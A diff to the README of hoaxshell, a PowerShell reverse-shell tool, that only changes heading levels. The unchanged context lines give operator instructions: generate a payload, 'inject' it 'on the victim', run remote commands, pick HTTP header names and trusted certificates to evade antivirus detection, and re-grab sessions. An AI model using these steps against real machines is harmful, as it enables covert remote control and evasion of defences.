@@ -31,19 +31,19 @@ chmod +x hoaxshell.py
 ## Usage
 **Important**: As a means of avoiding detection, hoaxshell is automatically generating random values for the session id, URL paths and name of a custom http header utilized in the process, every time the script is started. The generated payload will work only for the instance it was generated for. Use the `-g` option to bypass this behaviour and re-establish an active session or reuse a past generated payload with a new instance of hoaxshell. 
 
-#### Basic shell session over http
+### Basic shell session over http
 ```
 sudo python3 hoaxshell.py -s <your_ip>
 ```  
 When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the "rawpayload" prompt command or start hoaxshell with the `-r` argument. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.  
 
-#### Recommended usage to avoid detection (over http)
+### Recommended usage to avoid detection (over http)
 Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. Use -H to provide a standard or custom http header name to avoid detection.
 ```
 sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
 ```
 
-#### Encrypted shell session (https)
+### Encrypted shell session (https)
 ```
 # Generate self-signed certificate:
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
@@ -54,13 +54,13 @@ sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pe
 ```  
 The generated PowerShell payload will be longer in length because of an additional block of code that disables the ssl certificate validation.
 
-#### Encrypted shell session with a trusted certificate
+### Encrypted shell session with a trusted certificate
 If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem).
 ```
 sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
 ```
 
-#### Grab session mode
+### Grab session mode
 In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.
 ```
 sudo python3 hoaxshell.py -s <your_ip> -g
